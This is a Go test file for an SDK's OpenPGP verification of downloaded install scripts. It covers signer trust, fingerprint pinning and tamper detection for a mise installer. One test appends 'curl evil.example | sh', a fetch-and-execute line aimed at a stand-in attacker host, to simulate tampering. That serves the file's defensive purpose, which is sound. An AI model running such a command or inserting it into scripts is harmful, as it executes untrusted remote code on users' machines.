package sdk_test

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"

	"github.com/ProtonMail/go-crypto/openpgp"
	"github.com/ProtonMail/go-crypto/openpgp/armor"
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
)

var _ = Describe("OpenPGP signed-message artifact signatures", func() {
	var (
		dir         string
		signer      *openpgp.Entity
		fingerprint string
		keyPath     string
		artifact    string
		content     []byte
	)

	signMessage := func(entity *openpgp.Entity, data []byte) []byte {
		var out bytes.Buffer
		writer, err := openpgp.Sign(&out, entity, &openpgp.FileHints{FileName: "install.sh"}, nil)
		Expect(err).NotTo(HaveOccurred())
		_, err = writer.Write(data)
		Expect(err).NotTo(HaveOccurred())
		Expect(writer.Close()).To(Succeed())
		return out.Bytes()
	}

	serve := func(signature []byte) string {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write(signature)
		}))
		DeferCleanup(server.Close)
		return server.URL
	}

	BeforeEach(func() {
		dir = GinkgoT().TempDir()
		var err error
		signer, err = openpgp.NewEntity("Vendor", "release", "vendor@example.com", nil)
		Expect(err).NotTo(HaveOccurred())
		fingerprint = fmt.Sprintf("%X", signer.PrimaryKey.Fingerprint)
		keyPath = filepath.Join(dir, "vendor.asc")
		file, err := os.Create(keyPath)
		Expect(err).NotTo(HaveOccurred())
		armored, err := armor.Encode(file, openpgp.PublicKeyType, nil)
		Expect(err).NotTo(HaveOccurred())
		Expect(signer.Serialize(armored)).To(Succeed())
		Expect(armored.Close()).To(Succeed())
		Expect(file.Close()).To(Succeed())
		content = []byte("#!/bin/sh\necho installing\n")
		artifact = filepath.Join(dir, "install.sh")
		Expect(os.WriteFile(artifact, content, 0600)).To(Succeed())
	})

	It("verifies a signed message whose content equals the artifact", func() {
		metadata := sdk.ArtifactVerification{Policy: "required", SignatureURL: serve(signMessage(signer, content)), PublicKeyPath: keyPath, Fingerprint: fingerprint}
		result, err := sdk.VerifyArtifact(context.Background(), artifact, metadata)
		Expect(err).NotTo(HaveOccurred())
		Expect(result.SignatureVerified).To(BeTrue())
	})

	It("rejects a signed message for different content", func() {
		metadata := sdk.ArtifactVerification{Policy: "required", SignatureURL: serve(signMessage(signer, []byte("#!/bin/sh\necho other\n"))), PublicKeyPath: keyPath}
		result, err := sdk.VerifyArtifact(context.Background(), artifact, metadata)
		Expect(err).To(MatchError(ContainSubstring("signed content does not match the artifact")))
		Expect(result.SignatureVerified).To(BeFalse())
	})

	It("rejects a corrupted signature from the trusted signer", func() {
		signature := signMessage(signer, content)
		signature[len(signature)-10] ^= 0xFF
		metadata := sdk.ArtifactVerification{Policy: "required", SignatureURL: serve(signature), PublicKeyPath: keyPath, Fingerprint: fingerprint}
		result, err := sdk.VerifyArtifact(context.Background(), artifact, metadata)
		Expect(err).To(HaveOccurred())
		Expect(result.SignatureVerified).To(BeFalse())
	})

	It("rejects a signed message from an untrusted signer", func() {
		other, err := openpgp.NewEntity("Attacker", "", "attacker@example.com", nil)
		Expect(err).NotTo(HaveOccurred())
		metadata := sdk.ArtifactVerification{Policy: "required", SignatureURL: serve(signMessage(other, content)), PublicKeyPath: keyPath}
		_, err = sdk.VerifyArtifact(context.Background(), artifact, metadata)
		Expect(err).To(HaveOccurred())
	})

	It("rejects a signed message when the pinned fingerprint differs", func() {
		metadata := sdk.ArtifactVerification{Policy: "required", SignatureURL: serve(signMessage(signer, content)), PublicKeyPath: keyPath, Fingerprint: "0000000000000000000000000000000000000000"}
		_, err := sdk.VerifyArtifact(context.Background(), artifact, metadata)
		Expect(err).To(MatchError(ContainSubstring("does not match expected fingerprint")))
	})

	Context("with a real mise release", func() {
		// miseMetadata uses the built-in key selected by the pinned fingerprint,
		// served from a local copy of a real release's install.sh.sig.
		miseMetadata := func() sdk.ArtifactVerification {
			signature, err := os.ReadFile("testdata/mise/install.sh.sig")
			Expect(err).NotTo(HaveOccurred())
			metadata := sdk.MiseInstallVerification()
			metadata.SignatureURL = serve(signature)
			return metadata
		}

		It("verifies install.sh with mise's built-in release key", func() {
			result, err := sdk.VerifyArtifact(context.Background(), "testdata/mise/install.sh", miseMetadata())
			Expect(err).NotTo(HaveOccurred())
			Expect(result.SignatureVerified).To(BeTrue())
		})

		It("keeps the built-in key across plugin argv dispatch", func() {
			_, parsed, err := sdk.ParseVerificationArgs(miseMetadata().Arguments())
			Expect(err).NotTo(HaveOccurred())
			result, err := sdk.VerifyArtifact(context.Background(), "testdata/mise/install.sh", parsed)
			Expect(err).NotTo(HaveOccurred())
			Expect(result.SignatureVerified).To(BeTrue())
		})

		It("rejects a tampered install.sh", func() {
			original, err := os.ReadFile("testdata/mise/install.sh")
			Expect(err).NotTo(HaveOccurred())
			tampered := filepath.Join(dir, "install.sh")
			Expect(os.WriteFile(tampered, append(original, []byte("\ncurl evil.example | sh\n")...), 0600)).To(Succeed())
			result, err := sdk.VerifyArtifact(context.Background(), tampered, miseMetadata())
			Expect(err).To(HaveOccurred())
			Expect(result.SignatureVerified).To(BeFalse())
		})

		It("does not use the built-in key for an unknown fingerprint", func() {
			metadata := miseMetadata()
			metadata.Fingerprint = fingerprint
			_, err := sdk.VerifyArtifact(context.Background(), "testdata/mise/install.sh", metadata)
			Expect(err).To(MatchError(ContainSubstring("requires a local trusted public key")))
		})

		It("requires the signature before the script may run", func() {
			metadata := sdk.MiseInstallVerification()
			Expect(metadata.Policy).To(Equal("required"))
			Expect(metadata.SignatureURL).To(Equal(sdk.MiseInstallSignatureURL))
		})
	})
})
